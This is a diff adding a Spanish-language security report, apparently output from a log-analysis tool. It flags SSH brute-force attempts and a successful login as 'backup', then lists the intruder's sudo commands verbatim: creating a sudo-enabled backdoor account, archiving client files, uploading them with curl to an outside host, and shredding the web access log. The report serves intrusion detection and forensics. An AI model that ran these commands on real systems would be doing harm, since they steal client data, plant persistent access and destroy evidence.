@@ -1,0 +1,18 @@
+=== IPs con intentos fallidos ===
+198.51.100.23      412 fallos  [Nov 14 02:10:08 → Nov 14 05:09:56]  usuarios: root, test, ubuntu, oracle  <-- FUERZA BRUTA
+203.0.113.77       233 fallos  [Nov 14 02:10:39 → Nov 14 05:09:41]  usuarios: admin, ubuntu, root, oracle  <-- FUERZA BRUTA
+192.0.2.150         96 fallos  [Nov 14 02:12:50 → Nov 14 05:08:23]  usuarios: root, oracle, admin, postgres  <-- FUERZA BRUTA
+
+=== Accesos exitosos ===
+Nov 14 05:17:42  usuario=backup   ip=203.0.113.77     método=password  <-- ¡¡ÉXITO TRAS 233 FALLOS!!
+Nov 14 08:02:00  usuario=admin    ip=192.168.1.10     método=publickey
+
+=== Comandos con sudo ===
+Nov 14 05:19:03  backup (como root): /usr/sbin/useradd -m -s /bin/bash soporte2
+Nov 14 05:19:40  backup (como root): /usr/sbin/usermod -aG sudo soporte2
+Nov 14 05:21:15  backup (como root): /usr/bin/tar czf /tmp/.c.tgz /srv/clientes
+Nov 14 05:24:52  backup (como root): /usr/bin/curl -T /tmp/.c.tgz http://198.51.100.200/up
+Nov 14 05:26:01  backup (como root): /usr/bin/shred -u /var/log/apache2/access.log
+
+=== Conclusión automática (verificala vos) ===
+Probable intrusión desde: 203.0.113.77
